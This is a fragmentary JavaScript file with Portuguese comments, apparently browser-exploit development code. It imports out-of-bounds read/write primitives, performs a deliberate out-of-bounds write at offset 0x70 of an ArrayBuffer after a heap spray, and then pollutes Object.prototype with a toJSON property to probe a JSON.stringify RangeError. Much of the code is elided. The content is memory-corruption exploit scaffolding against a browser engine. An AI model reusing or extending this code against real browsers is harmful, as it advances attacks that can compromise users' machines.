...
import {
    ...
    oob_write_absolute,
    oob_read_absolute, // Adicionado para ler de volta o teste de escrita segura
    clearOOBEnvironment
...
// Usaremos apenas a toJSON mais simples para este teste de crash
...
export async function executeInvestigatePropertyAccessInRangeError() {
    const FNAME_TEST = "executeInvestigatePropertyAccessInRangeError_v23_DebugOOBWrite";
    logS3(`--- Iniciando ${FNAME_TEST}: Depurando Escrita OOB em 0x70 ---`, "test", FNAME_TEST);
    document.title = `Debug OOBWrite@0x70`;

    const spray_count = 10; // Reduzido, pois o foco é o crash
    ...
    if (!oob_array_buffer_real || !oob_dataview_real) { // Adicionado cheque para oob_dataview_real
        logS3("Falha OOB Setup (oob_array_buffer_real ou oob_dataview_real nulo). Abortando.", "error", FNAME_TEST);
    ...
    try {
        logS3(`   ESCRITA CRÍTICA: Tentando escrever ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        // LOG IMEDIATAMENTE ANTES
        logS3("     ...IMEDIATAMENTE ANTES de oob_write_absolute(0x70)...", "warn", FNAME_TEST);

        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);

        // LOG IMEDIATAMENTE DEPOIS
        critical_write_succeeded = true; // Se chegamos aqui, a chamada não travou
        logS3("     ...IMEDIATAMENTE APÓS oob_write_absolute(0x70)... Escrita NÃO TRAVOU.", "good", FNAME_TEST);

        // Tentar ler de volta para confirmar (se não travou)
    ...
    // Sondagem Mínima se a escrita crítica não travou
    ...
    if (critical_write_succeeded) {
        ...
        try {
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_Complex_V0_EmptyReturn, // A mais simples
            ...
            if (e_str.name === 'RangeError') { document.title = `RangeError DebugWrite!`; }
            else { document.title = `Error Stringify DebugWrite!`; }
        } finally {
            if (pollutionApplied) {
